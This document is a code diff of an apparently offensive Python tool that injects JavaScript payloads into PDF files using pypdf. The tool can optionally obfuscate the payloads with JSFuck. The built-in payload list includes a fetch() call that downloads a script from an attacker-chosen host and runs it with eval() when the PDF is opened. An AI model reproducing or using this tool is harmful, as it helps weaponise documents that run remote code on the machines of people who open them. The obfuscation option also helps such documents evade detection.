@@ -1,7 +1,6 @@
-#TODO: ADD BANNER AND LOGO
 #https://pypdf.readthedocs.io/en/stable/user/add-javascript.html
 
-from pypdf import PdfWriter
+from pypdf import PdfWriter, PdfReader
 import argparse, execjs, time
 
 
@@ -15,13 +14,15 @@ parser.add_argument("-ob", "--obfuscate", action="store_true", help="obfuscate t
 
 args = parser.parse_args()
 
-banner = """"""
+banner = r"""     __     _____ ____  _____
+|--_ /_-| |    ||    \|  __| _  __ _  _    ___  ___  ___  ___  ___
+|  / /  | | |__|| |  ||  __|| || \  || |_ | __|/ __||_ _||   || |_|
+|--/----| |__|  |____/|__|  |_||_|\_|| / /|_--|\___| |_| |___||_\_\ V1.0"""
 payloads = [
-    "alert('ARGUMENT');", "classic alert text", 
     
-    "console.log('JavaScript is running'); alert('ARGUMENT');", "log to console and alerts",
+    "console.println('JavaScript is running');", "classic log",
 
-    """fetch('https://ARGUMENT/ARGUMENT1.js')
+    """fetch('https://ARGUMENT/ARGUMENT.js')
     .then(response => response.text())
     .then(script => eval(script))
     .catch(error => console.error('Error loading script:', error));""", "a code in a remote server",
@@ -34,6 +35,7 @@ payloads = [
 
 def inject(pdft, payload, output):
     print("INJECT...")
+    pdft = PdfReader(pdft)
     pdf = PdfWriter(clone_from=pdft)
     pdf.add_js(payload)        
     with open(output, "wb") as pdftrg:
@@ -47,23 +49,31 @@ def obf(payload):
     return cjs.call('JSFuck',payload,'1')
 
 def main():
+    print(banner)
     payload = ""
 
+    if args.output:
+        output = args.output
+    else: 
+        output = args.file
+        
     if args.custompayload:
         payload = args.custompayload
     elif args.customfilepayload:
         payload = args.customfilepayload
     else:
-        c = 0
-        for i in range(int(len(payloads)/2)):
-            print(c + 1)
-            print("CODE:")
-            print(payloads[c])
+        print("-"*40)
+        for index in range(0, len(payloads), 2):
+            print(f"{index//2 + 1}) \nCODE:")
+            print(payloads[index])
             print("DESCRIPTION:")
-            print(payloads[c + 1])
-            c+= 1
-        payload = input("select the number of the payload: ")
-        payload = payloads[int(payload)*2-2]
+            print(payloads[index + 1])
+            print("-" * 40)
+        payload = int(input("select the number of the payload: "))-1
+        if 0 <= payload < len(payloads) // 2:
+            payload = payloads[payload * 2]
+        else:
+            print("invalid input")
     
 
     if args.obfuscate:
@@ -75,11 +85,9 @@ def main():
     if args.file:
         print("USING:", payload)
         try:
-            if args.output:
-                inject(args.file, payload, args.output)
-            else:
-                inject(args.file, payload, args.file)
+            inject(args.file, payload, output)
         except Exception as e:
             print(f'error during injection: {e}')
-
+        else:
+            print(f"INJECTION SUCCESFULL IN: {output}")
 main()
